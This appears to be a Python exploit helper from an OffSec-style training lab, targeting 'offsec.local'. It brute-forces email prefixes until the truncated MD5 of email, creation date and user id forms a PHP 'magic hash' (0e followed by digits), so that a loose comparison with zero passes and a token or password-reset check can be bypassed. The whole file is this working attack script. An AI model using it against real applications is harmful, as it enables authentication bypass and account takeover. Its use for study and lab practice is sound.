import hashlib, string, itertools, re, sys

def gen_code(domain, id, date, prefix_length):
    count = 0
    for word in map(''.join, itertools.product(string.ascii_lowercase, repeat=int(prefix_length))):
        word_bytes = word.encode('utf-8')
        domain_bytes = domain.encode('utf-8')
        id_bytes = id.encode('utf-8')
        date_bytes = date.encode('utf-8')
        input_string = word_bytes + b'@' + domain_bytes + date_bytes + id_bytes
        hash = hashlib.md5(input_string).hexdigest()[:10]
        if re.match(r'0+[eE]\d+$', hash):
            print("(+) Found a valid email! %s@%s" % (word, domain))
            print("(+) Requests made: %d" % count)
            print("(+) Equivalent loose comparison: %s == 0\n" % (hash))
        count += 1

def main():
    # if len(sys.argv) != 5:
    #     print('(+) usage: %s <domain_name> <id> <creation_date> <prefix_length>' % sys.argv[0])
    #     print('(+) eg: %s offsec.local 3 "2018-06-10 23:59:59" 3' % sys.argv[0])
    #     sys.exit(-1)
    
    #  offsec.local 3 "2018-06-10 23:59:59" 3


    domain = 'offsec.local'
    id = '3'
    creation_date = '2018-06-10 23:59:59'
    prefix_length = 4

    gen_code(domain, id, creation_date, prefix_length)

if __name__ == "__main__":
    main()
